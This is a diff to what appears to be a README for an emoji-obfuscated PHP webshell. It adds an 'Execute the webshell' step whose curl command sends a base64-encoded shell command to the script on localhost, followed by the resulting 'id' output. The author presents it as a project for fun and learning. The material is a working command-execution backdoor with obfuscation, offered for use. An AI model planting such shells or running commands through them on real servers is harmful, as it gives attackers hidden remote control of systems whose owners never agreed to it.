@@ -62,4 +62,11 @@ $🤯=@${$🥳}[$__] ? $👿(@${$🥳}[$__]) : $🌮.$🍔.$🌔.$🌏.$🌒.$�
 
 ```
 
+Execute the webshell.
+
+```sh
+❯ curl http://127.0.0.1/emoji.php\?4\=`echo id | base64`
+uid=501(someone) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),101(access_bpf),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae),701(com.apple.sharepoint.group.1)
+```
+
 Im just building this for fun and for the sake of learning new things. ☕️🥯
